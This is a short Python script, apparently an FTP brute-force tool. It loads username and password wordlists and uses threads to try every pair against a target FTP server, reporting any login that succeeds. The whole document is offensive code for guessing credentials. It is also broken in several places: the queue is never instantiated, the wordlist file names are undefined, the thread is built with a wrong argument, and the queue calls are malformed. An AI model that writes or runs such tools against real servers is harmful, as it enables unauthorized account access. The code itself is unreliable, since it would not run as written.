import ftplib
import pyfiglet
import queue
from threading import Thread

q = queue.Queue
threads = 10
host = ''
userList = []
passList = []
port = 21

def login(user,password):
    server = ftplib.FTP()
    try:
        server.connect(host, port, timeout=5)
        server.login(user, password)
    except ftplib.error_perm:
        return False
    else:
        print("[+] {user}:{password} correct!")
        with q.mutex:
            q.queue.clear()
            q.all_tasks_done.notify_all()
            q.unfinished_tasks = 0
    finally:
        q.task_done

g = open(userFile, 'r')
for line in g:
    userList.append(line)
g.close()

g = open(passFile, 'r')
for line in g:
    passList.append(line)
g.close()

for user in userList:
    for password in passList:
        q.put(user, password)

for t in range(threads):
    thread = Thread(thread=login)
    thread.daemon = True
    thread.start()
q.join()